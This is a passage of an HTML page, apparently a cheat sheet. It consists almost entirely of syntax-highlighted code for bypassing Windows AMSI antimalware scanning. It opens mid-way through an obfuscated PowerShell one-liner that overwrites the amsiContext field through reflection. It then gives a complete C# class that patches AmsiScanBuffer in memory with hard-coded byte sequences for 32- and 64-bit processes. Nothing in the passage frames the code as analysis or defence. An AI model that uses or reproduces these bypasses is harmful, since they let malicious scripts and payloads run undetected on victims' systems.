style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;siUt&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;ils&#39;</span>);<span style="color:#0088ff;font-weight:400">$y</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$x</span>.GetField(<span style="color:#333333;font-weight:400">&#39;am&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;siCon&#39;</span><span style="color:#ff9d00;font-weight:700">+</span><span style="color:#333333;font-weight:400">&#39;text&#39;</span>,[Reflection.BindingFlags]<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>);<span style="color:#0088ff;font-weight:400">$z</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$y</span>.GetValue(<span style="color:#0088ff;font-weight:400">$null</span>);[Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>WriteInt32(<span style="color:#0088ff;font-weight:400">$z</span>,<span style="color:#333333;font-weight:400">0x41424344</span>)</pre></div></p><p></p><p></p><p><h2>AMSI bypass: memory patching (c#)</h2></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><br /><span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> AmsiBypass<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Execute()<br />    {<br />        <span style="color:#0088ff;font-weight:400">// Load amsi.dll and get location of AmsiScanBuffer</span><br />        <span style="color:#ff9d00;font-weight:700">var</span> lib = LoadLibrary(<span style="color:#3ad900;font-weight:400">&quot;amsi.dll&quot;</span>);<br />        <span style="color:#ff9d00;font-weight:700">var</span> asb = GetProcAddress(lib, <span style="color:#3ad900;font-weight:400">&quot;AmsiScanBuffer&quot;</span>);<br /><br />        <span style="color:#ff9d00;font-weight:700">var</span> patch = GetPatch;<br /><br />        <span style="color:#0088ff;font-weight:400">// Set region to RWX</span><br />        _ = VirtualProtect(asb, (UIntPtr)patch.Length, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff9d00;font-weight:700">out</span> <span style="color:#7f0044;font-weight:400">uint</span> oldProtect);<br /><br />        <span style="color:#0088ff;font-weight:400">// Copy patch</span><br />        Marshal.Copy(patch, <span style="color:#ff0044;font-weight:400">0</span>, asb, patch.Length);<br /><br />        <span style="color:#0088ff;font-weight:400">// Restore region to RX</span><br />        _ = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, <span style="color:#ff9d00;font-weight:700">out</span> <span style="color:#7f0044;font-weight:400">uint</span> _);<br />    }<br /><br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">byte</span>[] GetPatch<br />    {<br />        <span style="color:#ff9d00;font-weight:700">get</span><br />        {<br />            <span style="color:#ff9d00;font-weight:700">if</span> (Is64Bit)<br />            {<br />                <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[] { <span style="color:#ff0044;font-weight:400">0xB8</span>, <span style="color:#ff0044;font-weight:400">0x57</span>, <span style="color:#ff0044;font-weight:400">0x00</span>, <span style="color:#ff0044;font-weight:400">0x07</span>, <span style="color:#ff0044;font-weight:400">0x80</span>, <span style="color:#ff0044;font-weight:400">0xC3</span> };<br />            }<br /><br />            <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[] { <span style="color:#ff0044;font-weight:400">0xB8</span>, <span style="color:#ff0044;font-weight:400">0x57</span>, <span style="color:#ff0044;font-weight:400">0x00</span>, <span style="color:#ff0044;font-weight:400">0x07</span>, <span style="color:#ff0044;font-weight:400">0x80</span>, <span style="color:#ff0044;font-weight:400">0xC2</span>, <span style="color:#ff0044;font-weight:400">0x18</span>, <span style="color:#ff0044;font-weight:400">0x00</span> };<br />        }<br />    }<br /><br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">bool</span> Is64Bit<br />    {<br />        <span style="color:#ff9d00;font-weight:700">get</span><br />        {<br />            <span style="color:#ff9d00;font-weight:700">return</span> IntPtr.Size == <span style="color:#ff0044;font-weight:400">8</span>;<br />        }<br />    }<br /><br />    [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetProcAddress(<br />        IntPtr hModule,<br />        <span style="color:#7f0044;font-weight:400">string</span> procName);<br /><br />    [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr LoadLibrary(<br />        <span style="color:#7f0044;font-weight:400">string</span> name);<br /><br />    [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span>)]<br />    <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> VirtualProtect(<br />        IntPtr lpAddress,<br />        UIntPtr dwSize,<br />        <span style="color:#7f0044;font-weight:400">uint</span> flNewProtect,<br />        <span style="color:#ff9d00;font-weight:700">out</span> <span style="color:#7f0044;font-weight:400">uint</span> lpflOldProtect);<br />}</pre></div></p></div>
</body>
</html>
